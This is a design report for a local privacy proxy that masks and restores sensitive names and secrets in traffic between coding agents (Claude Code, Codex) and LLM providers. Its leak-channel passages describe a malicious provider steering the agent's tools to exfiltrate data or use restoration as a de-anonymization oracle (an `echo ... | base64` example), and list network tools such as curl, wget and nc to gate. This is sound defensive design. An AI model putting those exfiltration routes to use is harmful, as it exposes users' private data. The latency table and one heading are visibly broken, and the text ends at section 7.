# Tacita: prior-art and design report

Date: 2026-10-24. This report combines six research angles: landscape, agent wiring, detection, rehydration, leak channels, and stack plus chat clients. Each angle went through an adversarial verification pass. The text below already includes the corrections from that pass. Refuted and unverified claims are collected in §11.

Many facts come from reading the `main` branch of fast-moving projects (Codex source, Claude Code docs) in October 2026. They can change with the next client release, which is why §6 and §7 require a canary test harness that is re-run on every client upgrade.

**Target machine, checked locally during this synthesis:** Intel Core i9-9880H, x86_64, macOS 15.6.1, Go 1.17.13 (`sysctl`, `uname -m`, `sw_vers`, `go version`). The latency figures marked "measured" were produced on this laptop by the detection researcher. The scripts are in `bench/ (not committed)`.

## 1. Executive summary

### What exists

About twenty open-source projects each cover part of what Tacita needs. The three closest were all created in 2026:

- **PasteGuard** (TypeScript/Bun plus a Python detector, Apache-2.0, about 770 stars) is the most mature. It has `/anthropic`, `/openai/v1` and `/codex` routes. It restores placeholders inside streamed tool-call JSON by buffering each tool block until `content_block_stop` ([source](https://github.com/sgasser/pasteguard/blob/main/src/providers/anthropic/stream-transformer.ts)).
- **llm-dlp** (Go, MIT, 5 stars, created 2026-10-03) is built for Claude Code. It uses keyed HMAC pseudonyms, "freezes" what was already sent, fails closed, and has a sudo-protected lock ([source](https://github.com/yurivenancio30/llm-dlp)).
- **PrivAiTe** (Python, BSD-3) has a gateway mode for Claude Code and Codex, a French spaCy model, a `verify` self-test, and never restores secrets ([source](https://github.com/crp4222/PrivAiTe)).

Also relevant:
- **Kiji Privacy Proxy** (Dataiku, Go, Apache-2.0) is a MITM proxy that already restores SSE token by token for Claude Code and Codex ([source](https://github.com/dataiku/kiji-proxy/blob/main/docs/09-coding-agents.md)).
- Rehydra (TS, MIT), VibeGuard (Go, Apache-2.0) and veilstream (streaming-reverser research code).

The well-known frameworks are a poor fit for coding round trips:
- **Presidio** is a stateless detection library, now governed by the community org Data Privacy Stack ([source](https://github.com/data-privacy-stack/presidio/blob/main/docs/project_transition.md)).
- **LLM Guard** was archived on 2026-07-08 ([source](https://github.com/protectai/llm-guard)).
- **LiteLLM's Presidio guardrail**: its June 2026 Anthropic streaming fix still passes `input_json_delta` through unrestored ([PR #30028](https://github.com/BerriAI/litellm/pull/30028)). A September follow-up was reported to duplicate thinking text and drop frames ([#42554](https://github.com/BerriAI/litellm/pull/42554), closed unmerged).
- **Portkey** is irreversible by design ([source](https://portkey.ai/docs/product/guardrails/pii-redaction)). **Cloudflare** only flags or blocks ([source](https://developers.cloudflare.com/ai-gateway/features/dlp/)). **Kong** restores only in its Enterprise plugin ([source](https://developer.konghq.com/plugins/ai-sanitizer/)).

### The gap Tacita fills

No existing project has a **mapping file that the user owns, can read and edit (confirm / allow / rename), and keeps over time, with an approval step in the terminal**. Every project keeps its mapping in memory for one request or one session, or rebuilds it from hashes.

Other gaps that no single project closes:
- **Full coverage of what is sent.** PrivAiTe and nopii skip the `system` field, which carries the cwd and the git status snapshot. Codex also sends the repo path and the git remote URL in headers ([source](https://github.com/openai/codex/blob/main/codex-rs/core/src/responses_metadata.rs)).
- **Identifier-aware case variants** (BoardData, board_data, BOARDDATA).
- **A per-session restore allowlist.**
- **An outbound-aware restore policy**, so real names are never restored into a curl URL.
- **French checksum recognizers.** Presidio ships none for France ([source](https://presidio.dataprivacystack.org/supported_entities/)).
- **A leak-audit harness.**

### Constraints imposed by the vendors' own documentation

1. **Non-Claude models are unsupported.** Anthropic "doesn't support routing Claude Code to non-Claude models through any gateway" ([source](https://code.claude.com/docs/en/llm-gateway)). OpenRouter only guarantees Claude Code with its Anthropic first-party provider ([source](https://openrouter.ai/docs/cookbook/coding-agents/claude-code-integration.md)). Using open-weight models from Claude Code is unsupported territory, so expect protocol quirks.
2. **Rewriting bodies is outside the supported pattern.** Anthropic's gateway guide says: "A gateway that rewrites or redacts request bodies for content inspection breaks the pairing the same way stripping does, so inspect without modifying" ([source](https://code.claude.com/docs/en/llm-gateway-protocol.md)). Tacita breaks this by design. It must therefore change string values only, never add, remove or reorder fields or blocks, forward `anthropic-*` headers and unknown fields verbatim, and be re-tested on every Claude Code release.
3. **No buffering.** Claude Code stalls if a gateway buffers the response. It expects every event through `message_stop`, and pings may be the only bytes on the wire during long thinking ([source](https://code.claude.com/docs/en/llm-gateway-protocol.md)).
4. **History must stay stable.** If earlier turns are rewritten inconsistently, recent Anthropic models reject the request ("bound to a different conversation"). This applies to Fable 5.1 and Opus, Sonnet and Haiku 5.5, and is enforced by default for accounts created on or after 2026-08-31. Inconsistent rewriting also breaks prompt caching on every provider ([preserved thinking](https://platform.claude.com/docs/en/build-with-claude/preserved-thinking), [caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)). Claude Code recovers by dropping earlier thinking, so the cost is quality and money, not a crash.
5. **Codex speaks only the Responses API.** Codex accepts only `wire_api = "responses"` ([source](https://learn.chatgpt.com/docs/config-file/config-reference)), so Tacita must speak the OpenAI Responses API to Codex.

### A proxy is necessary but not sufficient

Four families of leak stay open with a proxy alone (§7):
- **Direct vendor traffic that ignores the base URL:** the WebFetch hostname check, /feedback transcript uploads and claude.ai connectors ([source](https://code.claude.com/docs/en/data-usage.md)).
- **Metadata that is not prompt text:** Codex sends the absolute repo path, the git remote URL and the HEAD hash ([source](https://github.com/openai/codex/blob/main/codex-rs/core/tests/suite/git_enrichment.rs)).
- **Credentials in headers.**
- **An untrusted provider steering the agent's tools** (curl, git push), possibly using Tacita's own restoration step to recover real names.

### Build-vs-borrow verdict

Build a small core and borrow only commodity pieces. This fits the user's goal of taking the best ideas from each project while keeping a codebase they control and understand.

- **Write yourself:** the request scrubber, mapping store, stream restorer, policy engine, `setup` and `doctor` commands, and the `watch` logic. My estimate is a few thousand lines of Go.
- **Depend on:** small, auditable libraries only: Bubble Tea, an Aho-Corasick package, mvdan/sh and age.
- **Vendor data, not engines:** gitleaks' MIT rule file.
- **Read but do not import:** PasteGuard, llm-dlp, Kiji, PrivAiTe and veilstream. Turn each of their documented bugs into a regression test.
- **Keep ML optional:** a sidecar that only proposes candidates.

**Stack:** Go, built as a single `CGO_ENABLED=0` binary, with a Bubble Tea v2 TUI attached over a Unix socket and ML NER in an optional sidecar. The main alternative is Rust (§8).

### Suggested order of work

0. **Before writing Tacita (one or two days):**
   - Check that Claude Code with `ANTHROPIC_BASE_URL=https://openrouter.ai/api` works at all with the chosen open-weight model: tool use, thinking fields, `role:"system"` entries.
   - Record real Claude Code and Codex traffic on a throwaway repo seeded with canary names. These recordings become the fixture corpus.
1. **Anthropic path:** scrubber, mapping file, dictionary and secrets layers, stream restorer with property tests, replay cache, `tacita verify`.
2. `tacita watch`, `tacita setup` and `tacita doctor`, then the Codex Responses path.
3. Network-jail launcher, ML sidecar, business-chat dialects.

### 2e. Research that shaped the design

- **SlotGuard** ([arXiv 2607.17147](https://arxiv.org/html/2607.17147)). Typed slots that keep structure, plus per-session HMAC handles, reached 89.5–100% success, against 93.5–100% raw. Generic redaction reached 2.5% and opaque typed placeholders 20.5–38.5%. Caveats: these are synthetic workflow probes with no executed edits, and it uses bracketed slots. Code: github.com/illinoisdata/SlotGuard.
- **"When Names Disappear"** ([arXiv 2510.03178](https://arxiv.org/html/2510.03178v1)). Renaming identifiers hurts code understanding, by up to 23.8 points. Replace only the entity substring and keep every other word of the identifier.
- **Pasch & Cha** ([PrivateNLP 2025](https://aclanthology.org/2025.privatenlp-main.3/)). Masking costs about 1 point out of 10 on personal-writing tasks, and the benefit of context cues depends on the model.

## 4. Wiring Claude Code and Codex to OpenRouter through Tacita

### 4.1 Shape

```
Claude Code ──Anthropic Messages (SSE)──┐
                                         ├─► 127.0.0.1:<port>  tacitad
Codex CLI ───OpenAI Responses (SSE)─────┘     1. auth (local token) + header policy
                                              2. scrub (generic string walk, mapping snapshot)
                                              3. policy (block secrets/images, inject provider prefs)
                                              4. forward in the SAME format ──► OpenRouter / vendor endpoint
                                              5. restore the stream per block ◄──
tacita watch ◄── Unix socket ── events, decisions
```

Masking runs before any format conversion, and restoration runs after any conversion on the way back. That keeps format bridging outside the privacy guarantee: it can be delegated to OpenRouter, or later to an in-house translator, without changing what is protected.

### 4.2 Claude Code recipe (written by `tacita setup claude` into `~/.claude/settings.json`, with a backup and an undo)

Put the values in the `env` block of `~/.claude/settings.json`, not only in shell exports. Settings-file values override shell exports. Background agents run under a supervisor and do not reliably see shell exports. The VS Code extension shares the same file ([connect](https://code.claude.com/docs/en/llm-gateway-connect.md), [vs-code](https://code.claude.com/docs/en/vs-code.md)).

- **Value quirks.** Setting `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` to `0` still disables the traffic; to allow it again you must unset it. `DO_NOT_TRACK=0` leaves telemetry on ([env-vars](https://code.claude.com/docs/en/env-vars)).
- **Explicit model IDs bypass the aliases.** A subagent definition, a skill or `/model` with an explicit `claude-*` ID skips `ANTHROPIC_DEFAULT_*_MODEL` ([model-config](https://code.claude.com/docs/en/model-config.md)). Tacita must map or reject unknown model IDs (fail closed), never pass them upstream unchanged.
- **Optional hardening (`tacita lock`).** Write `/Library/Application Support/ClaudeCode/managed-settings.json` with `allowedProviders: ["customEndpoint"]` and a pinned `ANTHROPIC_BASE_URL`. Claude Code then refuses any other destination. This needs v2.1.285+ and admin rights, because managed scope is the only place the setting works ([llm-gateway](https://code.claude.com/docs/en/llm-gateway)). Without it, a project's `.claude/settings.json` can set `ANTHROPIC_BASE_URL` once the folder is trusted ([connect](https://code.claude.com/docs/en/llm-gateway-connect.md)).
- **Network jail (optional, §7).** Use `CLAUDE_CODE_PROCESS_WRAPPER` (v2.1.208+) or `processWrapper` (v2.1.210+) in the user `env` block to wrap background agents, and `CLAUDE_CODE_SHELL_PREFIX` to wrap Bash, hooks and stdio MCP servers ([corporate-launcher](https://code.claude.com/docs/en/corporate-launcher)). The sandbox's `network.httpProxyPort` can point Bash children at Tacita ([sandboxing](https://code.claude.com/docs/en/sandboxing)). Claude Code itself does not support SOCKS, so Tacita's egress endpoint must be HTTP CONNECT ([network-config](https://code.claude.com/docs/en/network-config.md)).
- **"Zero UX change" holds only for the CLI.** With a gateway credential, Remote Control and voice dictation are disabled, and the fast-mode check still goes to Anthropic ([connect](https://code.claude.com/docs/en/llm-gateway-connect.md)). The VS Code extension needs `claudeCode.environmentVariables` for its login check. Claude Desktop ignores `settings.json` and has its own third-party inference config (§9).

- **Never use `openai_base_url` to reach Tacita.** It goes through `create_openai_provider`, which always sets `supports_websockets: true`, so Codex would try WebSocket first. ### 4.4 API surface Tacita must speak in v1

**Header policy (resolving a conflict between the angles).** The leak-channels angle wanted a strict header allowlist. Anthropic says to forward `anthropic-beta` verbatim and to treat headers and body fields as open lists ([gateway protocol](https://code.claude.com/docs/en/llm-gateway-protocol.md)). The compromise:
- Always drop `Authorization`, `x-api-key`, cookies, `x-claude-code-*`, `x-codex-*`, `x-openai-subagent` and the inbound `User-Agent`.
- Always inject the provider key from the Keychain.
- Forward `anthropic-version` and `anthropic-beta` verbatim, and only to Anthropic-format upstreams.
- Drop or randomize per session: `metadata.user_id`, Codex `client_metadata` (which includes the `workspaces` map with repo path, git remote, HEAD hash and `tool_namespaces_info`) and `prompt_cache_key`.
- If Tacita sends OpenRouter a `session_id` for sticky routing, use a random per-session value, never the Claude Code session ID ([OpenRouter caching](https://openrouter.ai/docs/guides/best-practices/prompt-caching)).
- Reject requests that still carry the OAuth `anthropic-beta` value (a sign that no gateway credential was set).

### 4.5 Translation pitfalls (for the v1.1 translator, or when an upstream is only partly compatible)

- **Payload Claude Code always sends.** For unrecognized model IDs Claude Code sends adaptive thinking, `output_config.effort`, `context_management`, `cache_control`, beta tool fields and mid-conversation `role:"system"` entries. `DISABLE_EXPERIMENTAL_BETAS` removes most betas but **not** adaptive thinking, effort or system entries ([gateway protocol](https://code.claude.com/docs/en/llm-gateway-protocol.md)).
- **Error bodies must pass unmodified.** Claude Code auto-retries when it sees specific error wording (thinking type, system messages, signature rejection, effort). Restoring placeholders inside an error is fine; wrapping or rewriting the error is not.
- **Vendor endpoints are partial implementations.** DeepSeek's Anthropic endpoint ignores `anthropic-beta`, `cache_control` and `is_error`, has no `document` or `redacted_thinking`, and ignores `budget_tokens` ([DeepSeek](https://api-docs.deepseek.com/guides/anthropic_api)). Keep a per-upstream capability table.
- **Kimi K2 tool-call IDs** must look like `functions.name:idx`, so a translator needs a reversible ID map. Tool-call accuracy also varies a lot between vendors hosting the same weights ([K2-Vendor-Verifier](https://github.com/MoonshotAI/K2-Vendor-Verifier)).
- **Translation corner cases:** `tool_result` with images, several `tool_result`s in one message, stop-reason and usage mapping, `max_tokens` above the model limit (clamp it per alias).
- **Thinking and effort mapping** to OpenRouter's unified `reasoning` for non-Claude models is **unverified**. Test it live.
- **`input_transformations`.** OpenRouter's Messages endpoint returns entries such as `thinking_dropped` with reason `prefix_binding_mismatch` ([source](https://openrouter.ai/docs/api/api-reference/anthropic-messages/create-a-message)). Pass them through and show them in `watch`: they are a visible sign of non-deterministic scrubbing.
- **Codex's request body** includes `include:["reasoning.encrypted_content"]`, `store:false`, `stream_options` and reasoning items. Codex clears `encrypted_content` for non-OpenAI providers but does not gate `client_metadata` ([client.rs](https://github.com/openai/codex/blob/main/codex-rs/core/src/client.rs)).
- **Starting models to evaluate:** GLM-5.x, the Kimi K series, DeepSeek V4 and Qwen3-Coder. Z.ai evaluated GLM-5.3 in the Claude Code harness ([card](https://huggingface.co/zai-org/glm-5.3)); leaderboard figures are low-confidence. Check exact slugs on openrouter.ai/models before pinning them.

## 5. Detection pipeline

### 5.1 Principle

Deterministic layers do the work, and ML only proposes candidates. The mapping file is the primary detector. It is the only mechanism that reliably catches identifiers such as `boardDataService`, and no published PII model has an organization or project label in its PII variant ([OPF](https://huggingface.co/openai/privacy-filter), [GLiNER2-PII](https://huggingface.co/fastino/gliner2-privacy-filter-PII-multi)). On hard benchmarks, ML span precision is about 0.24–0.54 ([OPF eval, single-author preprint](https://arxiv.org/abs/2608.02616)). So under fail-closed defaults the quality of the allowlist and of the review loop matters more than the choice of model.

### 5.2 Layers and latency

| 1 | Dictionary: Aho-Corasick over every variant of every mapping term, with identifier-boundary rules | Whole request, every time (cheap, gives full recall of known terms) | 6.6 ms per 400 KB, 5,003 terms, Python (measured); Go should be faster | `bench/bench_dict.py` |
| 2 | Secrets: gitleaks rules on a linear-time engine, keyword prefilter, generic-candidate filter, exact match of local secret values, recursive decoding | New blocks only | Python `re`: 377 ms per 400 KB, 195 ms of it in `generic-api-key` (measured). | 3 | Structured PII with checksums: email, FR/intl phone, IBAN mod-97, card Luhn, SIREN/SIRET Luhn (with the La Poste exception), NIR key, TVA key, IP addresses | New blocks | < 1 ms (estimate) | [python-stdnum siret](https://arthurdejong.org/git/python-stdnum/tree/stdnum/fr/siret.py) |

OPF q4: 249 ms per 97 tokens up to 12 s per 6.2k tokens (measured). GLiNER2: about 130–250 ms per chunk (published: [paper](https://arxiv.org/html/2507.18546v1), [Rust report](https://users.rust-lang.org/t/building-a-production-multilingual-pii-detection-system-in-rust-with-gliner2/139964)) | `bench/bench_onnx.py` |
| 5 | Optional local LLM adjudicator (Ollama), **asynchronous, `watch` only** | Candidates | llama3.2 3B: 3.95 s warm, 9.65 s cold (measured); it classified 4 of 4 correctly | `bench/llm.json` |

**Expected overhead per turn:** single-digit milliseconds up to about 20 ms for layers 0–3 on typical new content (a few KB to tens of KB). Layer 4 adds at most its cap (about 300 ms suggested) when new prose arrives. A "strict" mode waits for the full ML scan instead. Apple Silicon would be faster: about 150 ms p50 for GLiNER2 on M-series, as published.

Why the cache matters: the Messages API is stateless and resends the full history on every turn ([source](https://platform.claude.com/docs/en/build-with-claude/working-with-messages)). Replaying cached scrubbed output also keeps the prefix byte-identical, which prompt caching needs ([Anthropic](https://platform.claude.com/docs/en/build-with-claude/prompt-caching), [OpenAI](https://developers.openai.com/api/docs/guides/prompt-caching)).

### 5.3 Rules for the deterministic layers

- **Variants.** For each entity, generate flat, UPPER, camel, Pascal, snake, SCREAMING_SNAKE, kebab, Train-Case, dot.case, space-separated title case and lower case, plus accent-folded and NFC/NFD forms. Add irregular forms that were actually observed (e.g. `BoardDATA`) as explicit pairs.
- **Matching mode per entity:**
  - `substring` is the default for distinctive names of 6+ characters (`myboarddatabase` becomes `myprojectx01base`).
  - `boundary` is for short names and acronyms (`BD` must not match `BDD`).
  - `exact-case` is for names that are also common words (Orange, Free, Total, Pierre).
  - In `watch`, preview the repo match counts before the user confirms.
- **Seeding at install:** OS username and full name, `git config user.name` / `user.email`, git remotes (org and repo), `git log` authors, package names (npm scope, go.mod, pyproject, bundle IDs), top-level folder names, `~/.claude/CLAUDE.md`, project CLAUDE.md and AGENTS.md, MCP server names, email domains. macOS Contacts is optional and is a user decision.
- **Auto-allowlist** to avoid false positives: names from dependency manifests, standard-library and keyword lists, FR/EN wordlists, optionally a list of public companies. Store per-repo "allow" decisions in the mapping file.
- **Secrets:**
  - Vendor-anchored rules block automatically.
  - Generic rules (`generic-api-key` fired 84 times on 2 planted secrets in the benchmark) produce candidates that go through a filter: entropy at first, later Betterleaks-style token efficiency.
  - Never run any rule on a backtracking engine (ReDoS risk).
  - Go `regexp` is linear time. In Rust, `find_iter` is O(m·n²) in the worst case, so chunk huge tool outputs ([regex docs](https://docs.rs/regex/latest/regex/)).
- **Decoding.** gitleaks decodes only printable ASCII ([source](https://github.com/gitleaks/gitleaks#decoding)), so it misses `Soci%C3%A9t%C3%A9`. Tacita's decoder needs UTF-8 support and should also handle JSON `\u` escapes, HTML entities, git octal escapes and base64url (JWT).

### 5.4 ML layer: where and how

- **Feed it prose segments only.** Identifiers belong to the dictionary. CamemBERT tagged "Fetches KPIs for" as MISC and missed `marc.leroy` (measured).
- **Prose extraction.** tree-sitter is the clean way to separate comments and strings from code. Go bindings need cgo, which conflicts with `CGO_ENABLED=0`. Options: a lightweight comment/string lexer per language in Go, or put tree-sitter in the sidecar. This is my inference and needs a decision.
- **Model choice:**
  - GLiNER2 multi with labels `[person, organization, project, product]` (FR+EN, custom labels).
  - CamemBERT-NER for French-only prose.
  - OPF only as an optional English second opinion. It is "primarily English", has 8 fixed labels and weighs 917 MB in q4.
- **On this Intel Mac:**
  - ONNX Runtime 1.23.2 is the last x86_64 macOS build. 1.24+ ships arm64 only and requires macOS 14 ([release notes](https://github.com/microsoft/onnxruntime/releases/tag/v1.24.1)). Pin it, e.g. Rust `ort` with `api-23` and dynamic loading.
  - For prototyping `tacita eval`, a Python 3.12 venv with `torch 2.2.2`, `transformers<5` and `numpy<2` resolves for gliner2 2.1.0. Runtime was not tested. The earlier failure came from Python 3.14 plus unpinned transformers 5, not from the platform.
  - CoreML brings little on Intel. On Apple Silicon, set `ModelCacheDirectory` and pad inputs to fixed bucket sizes ([source](https://onnxruntime.ai/docs/execution-providers/CoreML-ExecutionProvider.html)).
- **Fail closed.** If a configured detector is down, block the request rather than send it unscanned.

### 5.5 Evaluation before choosing

Build `tacita eval` on:
- CredData samples ([source](https://github.com/Samsung/CredData));
- a labelled FR/EN set taken from the user's own repos and conversations;
- ai4privacy FR, following PrivAiTe's benchmark method.

Report precision, recall and p50/p95 latency per layer, on this laptop. Several headline numbers above are vendor-reported (Betterleaks, GLiNER2-PII SPY, Kiji); treat them as hypotheses.

## 6. Rehydration: design rules and tests

### 6.1 Why byte exactness rules everything

Claude Code's Edit tool does exact string replacement: "doesn't use regex or fuzzy matching", "A single character of whitespace or indentation difference is enough to miss", and `old_string` must appear exactly once unless `replace_all` is set ([tools reference](https://code.claude.com/docs/en/tools-reference)). The current file-writing tools are Edit, Write and NotebookEdit, plus Bash. MultiEdit is no longer listed. A failed Edit is safe because the model retries. A wrong restoration that still succeeds silently corrupts the repo.

### 6.2 Placeholder format

**Recommendation:** identifier-safe, type-tagged placeholders made of a kind word and a fixed-width ID that contains a letter, rendered in the case style of the surrounding text. Examples: `project_x01`, `ProjectX01`, `projectX01`, `PROJECT_X01`, `projectx01`, `project-x01`, "Project X01". Kinds: company, client, project, product, person, place, domain.

- **Why `x01` rather than `1`.** With `project_1`, the camelCase form `project1` equals the flat form `project1`, so `boardData` and `boarddata` would both map to it. A local prototype found no collision across 10 case styles with `x01` (local prototype, not committed). The fixed width keeps IDs prefix-free (`x01` vs `x010`). Use 3 digits if a kind can exceed 99 entities.
- **Avoid delimiters that renderers or shells eat or misread:** `__x__` (Markdown), `<x>` (HTML), `[[x]]` (bash and TOML syntax). PasteGuard's `[[TYPE_N]]` and Rehydra's XML tags cannot appear inside identifiers or paths.
- **Domains** map to the reserved `.example` TLD ([RFC 2606](https://www.rfc-editor.org/rfc/rfc2606)), e.g. `boarddata.io` becomes `projectx01.example`. **Emails** become a person placeholder plus a domain placeholder: `jean.dupont@boarddata.io` becomes `person.x03@projectx01.example`. Hostnames must never contain `_`.
- **Keep meaning.** Replace only the entity substring (`boardDataService` becomes `projectX01Service`), because renaming whole identifiers hurts models ([arXiv 2510.03178](https://arxiv.org/html/2510.03178v1)). Optional user-written descriptions and a gender for persons (French agreement) go in a **static** legend written once at session start. Keep honorifics outside the placeholder (`Mme person_x03`).
- **Realistic fakes are rejected for code.** Legacy reversers on fake first names wrongly restored 2–32% of responses ([veilstream](https://github.com/nikshepsvn/veilstream), author-run), and fakes can act as false premises. For business prose they remain an open question (§9).

### 6.3 Design rules

**Table and matching**
- **R1. Two pure functions over decoded JSON string values:** `scrub(text, snapshot)` and `restore(text, sessionTable)`. Both are driven by one surface table compiled from the mapping file. Never run regexes on raw request bytes. Never build a regex from a value or a placeholder (LLM Guard's unescaped `re.sub` turned `[REDACTED_PERSON_1]` into a character class).
- **R2. Injectivity check at build time.** No two real forms may map to one placeholder form, and the reverse. Otherwise fail with a clear message.
- **R3. Single pass, leftmost-longest Aho-Corasick, never rescanning its own output.** Restoration keeps the model's case style: `PROJECT_X01` becomes `BOARD_DATA` even if only `projectx01` was ever sent.
- **R4. Restore allowlist.** Restore only IDs that this session actually sent upstream, and check the kind. The session key is `x-claude-code-session-id` (always sent); for Codex, a conversation hash. `x-claude-code-request-class` only exists with `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1` ([gateway protocol](https://code.claude.com/docs/en/llm-gateway-protocol.md)). An ID that exists in the mapping file but was never sent in this session is **never** restored. Never fuzzy-match IDs (`x01` and `x02` are one edit apart).
- **R5. Mutation policy:**
  - Exact match: restore.
  - Pure style change: restore in that style.
  - Near miss (`Project_X1`, `projectx01s`, `ProjectX01's`): in prose, restore the stem and keep the suffix. In tool arguments, hold for a keypress if `watch` is open; otherwise restore only if exactly one entity fits, and log it.
  - Invented ID (never issued): never restore; show it in `watch`.
- **R6. Collisions.** When allocating an ID, check all of its forms against the repo (`git grep`). If outgoing text already contains a placeholder look-alike (pasted masked text, test fixtures), turn it into a reserved literal (`lit_x01`) that restores to itself (LiteLLM [#48029](https://github.com/BerriAI/litellm/issues/48029)).

**Streaming**
- **R7. Text deltas** (`text_delta`; Codex `output_text.delta`). Keep state per content block. Emit everything except the longest tail that is a proper prefix of any placeholder form (about 15 characters at most). Flush before `content_block_stop`, `message_delta` and `message_stop`. Restoring each chunk on its own is unsafe: LiteLLM's version produced "Jane DoeON_1>" ([#46087](https://github.com/BerriAI/litellm/issues/46087)).
- **R8. Tool blocks.**
  - Buffer each `tool_use` block until `content_block_stop`. Input deltas are not whole: a completed key/value is still split across several `partial_json` deltas ([streaming](https://platform.claude.com/docs/en/build-with-claude/streaming)).
  - Rewrite only JSON **string literals**, with a tolerant lexer: decode, restore, re-encode with correct escaping. Leave every other byte untouched (key order, `1e3`, integers above 2^53), and keep working on truncated JSON.
  - Then emit one `input_json_delta` followed by the stop event. PasteGuard's `restoreJsonStringValues` is a readable reference, but unlike it, restore inside complete literals even when the surrounding JSON is invalid.
  - Buffering costs little, because fine-grained tool streaming is off by default behind a custom base URL ([gateway protocol](https://code.claude.com/docs/en/llm-gateway-protocol.md)) and Claude Code cannot run a tool before the stop event anyway.
- **R9. Hold limits.**
  - Forward `ping` events and events of other blocks immediately.
  - Emit your own pings at least every 10 s while holding.
  - Behind a custom base URL, both watchdogs are 300 s. Pings extend the event-level watchdog only by about 5 more minutes, so a ping-only stream dies after roughly 10 minutes ([network-config](https://code.claude.com/docs/en/network-config.md)). Any hold must therefore be bounded to seconds, or at most a few minutes.
  - Codex has its own `stream_idle_timeout_ms`.
- **R10. Codex.** Its parser builds items from `response.output_item.done` and ignores `function_call_arguments.delta` ([responses.rs](https://github.com/openai/codex/blob/main/codex-rs/codex-api/src/sse/responses.rs)). Restore `output_item.done` (the authoritative copy), `response.completed`, `custom_tool_call_input.delta` and the display deltas consistently. Restore `apply_patch` text line by line, including the `*** Add File:`, `*** Delete File:`, `*** Move to:` and `@@ <context>` headers ([grammar](https://github.com/openai/codex/blob/main/codex-rs/core/assets/tools/apply_patch.lark)). Never expand a multi-line value into a single `+` line.
- **R11. Failure.** Never let placeholders reach disk silently. PasteGuard falls back to emitting the unrestored frames. If restoration fails, or a decision is needed and `watch` is closed, replace the `tool_use` with a text block explaining what was blocked and end the turn.

**History stability**
- **R12. Determinism.** IDs live in the mapping file, never in per-request counters. A snapshot is pinned when a session starts. The legend is static and sorted. Notes about newly confirmed entities are appended at the end of the current user turn, never in the system prompt mid-session (Rehydra's mid-session injection costs a cache miss).
- **R13. Replay cache for assistant turns.** After restoration, Claude Code and Codex store real names in their transcripts and resend them. Re-scrubbing alone is fragile: case-style restoration and near-miss handling break `scrub(restore(y)) == y`. Store the upstream's original placeholder-form content per assistant block, keyed by `tool_use_id` and by a hash of the restored form, and swap it back verbatim on the next request. Fall back to re-scrubbing. Test that the forwarded history equals what the provider saw, in values ([preserved thinking](https://platform.claude.com/docs/en/build-with-claude/preserved-thinking)).
- **R14. Never touch** `thinking`, `redacted_thinking.data`, `signature` or Codex `encrypted_content`. Placeholders will show in transcript mode. Optional display-only restoration needs a cache keyed by signature that swaps the original back on the next request ([thinking](https://platform.claude.com/docs/en/build-with-claude/thinking)).
- **R15. Preserve structure.** Never add, remove or reorder fields or blocks. Keep the `system` array shape and the `cache_control` markers. Walk **every** string value generically, with an explicit do-not-touch list (R14) rather than a list of fields to scan, because new fields appear each release. Scan object keys and alert on hits, but do not rewrite keys.
- **R16. Mapping changes mid-session.** Rename and allow take effect at the next session, or after an explicit "rebase" that accepts a cache reset. Newly hidden terms apply to new content immediately.
- **R17. Late detection (my inference, not from the sources).** If a term is first detected after it was already sent in clear in this session, the provider now sees both the real name and the placeholder and can link them. If placeholders are stable across sessions, that would expose the persistent ID. Rule: mask it from now on with a **session-scoped** alias, keep the persistent ID clean, and show a "leaked before detection" alert in `watch`.

**Secrets, outbound tools and quoting**
- **R18. Secrets are never sent.**
  - Option A (strict decision 1): replace with a `[SECRET_n]` marker that is never restored.
  - Option B: replace with a synthetic value in the same format (keeps config parseable), and restore it only into file-edit tools (Edit, Write, NotebookEdit, `apply_patch`) whose target path is the file where the secret was seen.
  - Under either option, never restore into Bash, WebFetch, MCP or anything that sends data out. Track derived and embedded copies: format-preserving fakes alone leaked 23.5% of planted credentials in SlotGuard. Treat credential-shaped strings invented by the model as literals.
- **R19. Outbound-aware restoration.**
  - Restore into URLs, hosts, `curl`/`wget`/`ssh`/`git remote`/`nc`/`dig` arguments, WebFetch, and MCP tools known to use the network **only for allowlisted hosts**. Otherwise hold briefly or block.
  - Treat every tool other than local Edit/Write/NotebookEdit/Read/Glob/Grep as potentially outbound. The current tool list includes WebSearch, Artifact, SendMessage, RemoteTrigger, PushNotification, Workflow and Agent ([tools reference](https://code.claude.com/docs/en/tools-reference)).
  - Scan tool results for encoded or transformed variants of mapped terms (base64, hex, URL-encoding, reversed, split characters) and fail closed. This closes the de-anonymization oracle (`echo project_x01 | base64`).
- **R20. Quoting.** At confirmation time, flag entities whose real forms contain `'`, `"`, `\`, `$`, a backtick or a newline (e.g. L'Oréal). For Bash arguments, find the quoting context with a shell lexer (`mvdan/sh`) and escape the value or hold it.
- **R21. Unicode and bytes.**
  - Match NFC, NFD and accent-stripped forms. Record the exact bytes of each observed form and restore the form seen in that context.
  - On macOS, git sets `core.precomposeUnicode`, so `git status` shows NFC with octal escapes while `ls` shows NFD ([git-config](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coreprecomposeUnicode)).
  - See through the line-number prefixes added by Read and Grep, and through ANSI color codes in Bash output.
- **R22. Images and PDFs** cannot be scrubbed in place. Block them by default for untrusted providers. Optional: local OCR (macOS Vision or Tesseract) and allow the image only if nothing matches.

### 6.4 Alternative worth a spike: restoring through hooks (Claude Code only)

Claude Code's `PreToolUse` hook can replace tool arguments (`updatedInput`), and `PostToolUse` can replace tool results (`updatedToolOutput`). The docs suggest exactly these hooks "for redaction or transformation use cases" ([hooks](https://code.claude.com/docs/en/hooks)). Only `UserPromptSubmit` is limited to blocking plus `additionalContext`.

Design B:
- The proxy masks outgoing traffic only.
- A `PreToolUse` hook restores placeholders right before Write, Edit or Bash runs.
- The transcript keeps placeholders, so history stays byte-stable with no re-masking.

Caveats:
- Hooks time out after 600 s by default and **fail open** unless `onFailure: "block"` is set.
- Whether history stores the original or the updated input is unverified.
- Codex needs stream restoration anyway.

**Recommendation:** use stream restoration plus the replay cache (works for both clients) in v1. Add a `PreToolUse` **guard hook** as a safety net: deny any tool call that still contains an issued placeholder, or that carries a restored value to a non-allowlisted network destination. Use `permissionDecision` deny/ask and `onFailure: "block"`. Then spike Design B.

## 7. Leak channels checklist (most severe first)

Two adversaries need different guarantees:
- Against a **passive, honest-but-curious provider** that only logs requests, scrubbing gives strong protection.
- Against an **active, malicious provider** that steers tool calls, only a network jail plus restore rules (R18, R19) protects you. Scrubbing alone never does ([lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)).

